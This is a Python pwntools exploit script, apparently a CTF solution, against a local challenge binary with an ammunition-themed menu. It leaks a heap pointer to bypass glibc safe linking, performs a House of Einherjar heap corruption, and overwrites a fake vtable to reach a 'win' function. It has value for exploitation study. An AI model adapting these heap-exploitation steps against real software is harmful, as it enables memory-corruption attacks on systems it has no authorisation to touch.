#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './build/faulty')

context.terminal = ["tmux", "splitw", "-h"]
def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

def ammo_interact(caliber, index, operation, payload=None):
    io.sendlineafter(">> ".encode(), str(operation).encode())
    io.sendlineafter(">> ".encode(), str(caliber).encode())
    # small or medium caliber ammo
    if type != 3:
        io.sendlineafter(">> ".encode(), str(index).encode())
    # description
    if operation == 4:
        io.sendlineafter(">> ".encode(), payload)

def craft_new_ammo(caliber, index):
    ammo_interact(caliber, index, 1)

def discard_ammo(caliber, index):
    ammo_interact(caliber, index, 2)

def fire_ammo(caliber, index):
    ammo_interact(caliber, index, 3)

def describe_ammo(caliber, index, payload):
    ammo_interact(caliber, index, 4, payload)

def decoding_fd(encoded_fd):
    encoded_fd ^= encoded_fd >> 12
    encoded_fd ^= encoded_fd >> 24
    return encoded_fd


if args.REMOTE:
    io = remote("localhost", 2060)
else:
    io = start()

print("===== Bypassing Safe Linking =====")

craft_new_ammo(1, 0)
craft_new_ammo(1, 1)

discard_ammo(1, 0)
discard_ammo(1, 1)

craft_new_ammo(1, 1)

fire_ammo(1, 1)
io.recvuntil("Ballistic profile: ".encode())
real_fd = decoding_fd(u64(io.recvn(4).ljust(8, b"\x00")))
print("Real fd: ", hex(real_fd))

print("===== Perform House of Einherjar =====")

# with 0x210 offset_from_tchunnk_to_chunk_A == chunk_size
offset_from_tchunnk_to_chunk_A = 0x430
chunk_A_header = real_fd + offset_from_tchunnk_to_chunk_A
chunk_size = 0x430

for i in range(8):

    fake = chunk_A_header + (chunk_size * i * 2) + 0x10
    # print(hex(fake))

    craft_new_ammo(2, i)            # chunk A
    craft_new_ammo(2, i + 1)        # chunk B

    if i == 7:
        craft_new_ammo(2, i + 2)    # chunk C (guard)
        
    payload = flat(
        0x421,                      # fake size at fake+0x08
        fake,                       # fd at fake+0x10
        fake,                       # bk at fake+0x18
        0x0,                        # fd_nextsize
        0x0,                        # bk_nextsize
        b"A" * (0x418 - 0x28),
        0x420                       # B->prev_size
    )
    describe_ammo(2, i, payload)

    payload = flat(
        b"B" * 0x3e8,               # padding to reach B1
        0x400,                      # prev_size of B
        0x31                        # size of the remainder
    )
    describe_ammo(2, i + 1, payload)

    discard_ammo(2, i + 1)

craft_new_ammo(3, 9)

print("===== Creating fake Vtable =====")

print("Fake: 0x{:x}".format(fake))

win = 0x404186
payload = flat(
    0x600,
    fake + 0x100,
    b"C" * (0x100 - 0x18),
    win
)
describe_ammo(2, 7, payload)
fire_ammo(3, 9)

io.interactive()

